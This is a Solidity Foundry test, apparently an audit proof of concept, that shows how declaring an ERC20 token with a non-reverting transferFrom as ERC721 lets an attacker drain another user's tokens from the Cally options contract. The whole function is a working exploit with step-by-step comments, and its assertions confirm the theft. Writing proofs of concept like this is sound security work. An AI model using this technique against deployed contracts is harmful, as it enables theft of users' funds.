function testDisguiseAsNFTAndSteal() public {
    // deploy contracts
    noRevertToken = new NoRevertToken(100 ether);
    cally = new Cally();
    cally.setFee(0.01 ether);
    // set starting balances of ETH and noRevertToken
    vm.deal(alice, 2 ether);
    noRevertToken.transfer(bob, 100 ether);

    // honest user Bob civilly creates a vault with 100 NoRevertTokens
    vm.startPrank(bob);
    noRevertToken.approve(address(cally), 100 ether);
    cally.createVault(
        100 ether,
        address(noRevertToken),
        3,
        5,
        4,
        1 ether,
        Cally.TokenType.ERC20
    );
    vm.stopPrank();
    // make sure balances at this stage are as expected
    assertEq(noRevertToken.balanceOf(address(cally)), 100 ether);
    assertEq(noRevertToken.balanceOf(alice), 0);
    assertEq(alice.balance, 2 ether);

    // alice performs the exploit
    vm.startPrank(alice);
    // Call to createVault here is successful despite Alice not approving her tokens for Cally and
    // not having enough tokens in the first place.
    // This is because ERC721(vault.token).transferFrom returns false instead of reverting for our NoRevertToken.
    // For different tokens, we might need to make transferFrom return false in different (potentially more subtle) ways.
    uint256 vaultId = cally.createVault(
        100 ether,
        address(noRevertToken),
        0,
        1,
        0,
        0,
        // Disguise our ERC20 NoRevertToken as ERC721.
        // This way we circumvent checks in SafeTransferLib's safeTransferFrom function
        // and make Cally contract use the unsafe ERC721(vault.token).transferFrom instead.
        Cally.TokenType.ERC721
    );
    // Alice buys option for her own vault
    uint256 optionId = cally.buyOption{value: 0.01 ether}(vaultId);
    // Alice exercises the option. If she didn't have enough ETH she could always use a flash loan.
    // Because we set the token type to ERC721 in createVault, the tokens are transferred again with
    // ERC721(vault.token).transferFrom.
    // This is why we need transferFrom(_from, _to, amount) for _from == msg.sender for our token
    // to behave like transfer(_to, amount) and not attempt to decrease allowance.
    cally.exercise{value: 1 ether}(optionId);
    // Get our ETH minus fee back
    cally.harvest();
    vm.stopPrank();
    
    // make sure Alice's exploit was successful
    assertEq(noRevertToken.balanceOf(address(cally)), 0);
    assertEq(noRevertToken.balanceOf(alice), 100 ether);
    assertEq(alice.balance, 2 ether - 0.01 ether);
}